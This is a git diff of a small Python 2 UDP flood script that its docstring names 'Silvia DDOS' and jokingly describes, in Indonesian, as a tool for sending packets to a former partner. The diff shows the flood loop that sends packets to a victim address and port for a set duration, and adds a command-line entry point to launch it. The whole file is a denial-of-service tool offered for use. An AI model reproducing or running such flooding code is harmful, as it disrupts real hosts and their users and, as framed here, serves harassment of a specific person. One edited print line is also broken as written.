@@ -1,3 +1,5 @@
+"""Silvia DDOS
+Tool untuk melakukan pengiriman packet kepada mantan terindah :'v """
 import time
 import socket
 import random
@@ -21,8 +23,14 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Paket Sedang Diantar Ke Oleh Kurir "(sent, victim, vport)
+        print "Paket Sedang OTW Harap Bersabar "%(sent, victim, vport)
 
-        
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
 if __name__ == '__main__':
     main()
